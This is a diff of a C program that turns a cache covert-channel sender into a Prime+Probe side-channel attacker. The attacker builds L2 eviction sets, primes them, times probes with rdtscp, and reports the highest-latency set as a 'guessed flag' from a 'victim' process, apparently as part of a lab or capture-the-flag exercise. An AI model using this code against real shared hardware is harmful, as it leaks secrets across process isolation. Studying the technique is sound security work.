@@ -1,96 +1,140 @@
-#include "util.h"
-#include <sys/mman.h>
-#include <stdlib.h>
 #include <stdio.h>
 #include <stdint.h>
-#include <time.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <limits.h>
+#include <sys/mman.h>
+#include "util.h"
 
-#define BUFF_SIZE (1<<21)
-#define L2_WAYS 16
-#define STRIDE (1<<16)
-#define SET_SPACING 32
-#define BASE_SET 64
+#define NUM_L2_CACHE_SETS 1024
+#define WAYS 16
+#define LINE_SIZE 64
+#define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
 
-struct node {
-    struct node *next;
-    char pad[64 - sizeof(struct node*)];
-};
+#define REPEATS 2000
 
-void *buffer;
-struct node *l2_sets[9];
+volatile uint8_t *buf;
+volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
 
-// Build a linked list for one set
-// Best working version
-void create_set(int set_idx) {
-    char *base = (char*)buffer;
-    struct node *prev = NULL;
-
-    for(int i=0; i<L2_WAYS; i++){
-        struct node *n = (struct node*)(base + (BASE_SET + set_idx*SET_SPACING)*64 + i*STRIDE);
-        if(prev) prev->next = n;
-        else l2_sets[set_idx] = n;
-        prev = n;
-    }
-    prev->next = NULL;
+static inline uint64_t rdtsc() {
+    unsigned hi, lo;
+    asm volatile("mfence");
+    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
+    asm volatile("mfence");
+    return ((uint64_t)hi << 32) | lo;
 }
 
-// Traverse a set to evict its cache lines
-void evict_set(int idx){
-    struct node *curr = l2_sets[idx];
-    while(curr) curr = curr->next;
-    // Second pass for reliability
-    curr = l2_sets[idx];
-    while(curr) curr = curr->next;
+static inline uint64_t rdtscp() {
+    uint32_t lo, hi;
+    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
+    return ((uint64_t)hi << 32) | lo;
 }
 
-// Evict only the data bits (0–7) in random order
-void evict_data_bits_random(int value){
-    int bits[8];
-    for(int i=0;i<8;i++) bits[i] = i;
+static inline void wait_cycles(uint64_t cycles) {
+    uint64_t start = rdtscp();
+    while (rdtscp() - start < cycles);
+}
 
-    // Fisher-Yates shuffle
-    for(int i=7;i>0;i--){
-        int j = rand() % (i+1);
-        int tmp = bits[i]; bits[i] = bits[j]; bits[j] = tmp;
-    }
-
-    for(int i=0;i<8;i++){
-        int b = bits[i];
-        if((value >> b) & 1) evict_set(b);
+void shuffle(int *arr) {
+    for(int i = NUM_L2_CACHE_SETS - 1; i > 0; i--) {
+        int j = rand() % (i + 1);
+        int tmp = arr[i];
+        arr[i] = arr[j];
+        arr[j] = tmp;
     }
 }
 
 int main() {
-    srand(time(NULL));
+    /* works around 3/5 of time on victim-4. Randomize access, reverse double probe, no usleep. High synchornization required for this version
+    */
+   /* REVERSE PROBING*/
+    printf("Attacker ready. Prime+Probe starting...\n");
+    /*test wait cycles for victim*/
+    wait_cycles(2000000);
 
-    buffer = mmap(NULL, BUFF_SIZE, PROT_READ|PROT_WRITE,
-                  MAP_POPULATE|MAP_ANONYMOUS|MAP_PRIVATE|MAP_HUGETLB, -1, 0);
+    buf = mmap(NULL,
+               2*1024*1024,
+               PROT_READ | PROT_WRITE,
+               MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
+               -1,
+               0);
 
-    if(buffer==(void*)-1){ perror("mmap"); exit(1); }
+    if(buf == (void*)-1){
+        perror("mmap failed");
+        exit(1);
+    }
 
-    *((char*)buffer) = 1;
+    *((char*)buf) = 1;
 
-    for(int i=0;i<=8;i++) create_set(i);
+    for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+        for(int w = 0; w < WAYS; w++) {
+            eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;
+        }
+    }
 
-    printf("Sender ready.\n");
+    volatile uint8_t tmp = 0;
 
-    char line[128];
-    while(fgets(line,sizeof(line),stdin)){
-        int value = atoi(line);
-        if(value<0 || value>255){ 
-            printf("Enter a value between 0 and 255\n"); 
-            continue; 
+    srand(rdtscp());
+
+    while(1) {
+
+        uint64_t scores[NUM_L2_CACHE_SETS] = {0};
+
+        
+
+        for(int r = 0; r < REPEATS; r++) {
+            int perm[NUM_L2_CACHE_SETS];
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
+                perm[i] = i;
+            }
+
+            shuffle(perm);
+
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+
+                int set = perm[i];
+
+                /* PRIME this set */
+                for(int w = 0; w < WAYS; w++) {
+                    tmp ^= *eviction_sets[set][w];
+                }
+
+                wait_cycles(5000);
+
+                /* PROBE this set */
+
+                uint64_t latency = 0;
+
+                for(int r = 0; r < 2; r++) {
+                    uint64_t start = rdtscp();
+
+                    for(int w = WAYS - 1; w >= 0; w--) {
+                        tmp ^= *eviction_sets[set][w];
+                    }
+
+                    uint64_t end = rdtscp();
+                    latency += (end - start);
+                }
+
+                scores[set] += latency;
+            }
+        }
+        int best_set = 0;
+        uint64_t best_latency = 0;
+
+        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+
+            uint64_t avg = scores[set] / REPEATS;
+
+            if(avg > best_latency) {
+                best_latency = avg;
+                best_set = set;
+            }
         }
 
-        printf("Sending %d\n", value);
+        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
 
-        long iterations = 2000000;
-        while(iterations--){
-            evict_set(8);             // Valid bit
-            evict_data_bits_random(value); // Data bits
-        }
-
-        printf("Sent.\n");
+        wait_cycles(2000);
     }
 
     return 0;
